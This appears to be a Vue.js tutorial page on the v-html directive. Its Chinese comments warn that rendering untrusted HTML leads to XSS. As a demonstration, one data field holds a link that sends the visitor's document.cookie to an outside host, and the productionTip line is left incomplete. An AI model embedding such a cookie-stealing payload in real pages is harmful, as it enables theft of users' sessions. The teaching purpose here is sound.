<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
    <script src="../js/vue.js"></script>
</head>
<body>
    <!-- v-html指令
        1.作用:向指定节点中渲染包含html结构的内容
        2.与插值语法的关联
            (1).v-html会替换掉节点中的内容,{{xx}}则不会
            (2).v-html可以识别html结构
        3.严重注意
            (1).在网站上动态渲染任意HTML结构是十分危险的，容易导致xxs攻击
            (2).一定要在可信的内容上使用v-html,永不要用在用户提交的内容上!
     -->
    <div id="root">
        <div>你好,{{name}}</div>
        <div v-html="str"></div>
        <div v-html="str2"></div>
    </div>
</body>
<script>
    Vue.config.productionTip = 
    
    new Vue({
        el:"#root",
        data:{
            name:"尚硅谷",
            str:"<h3>你好啊</h3>",
            str2:"<a href=javascript:location.href='http://www.baidu.com?'+document.cookie>是兄弟就来点我!</a>"
        }
    })
</script>
</html>
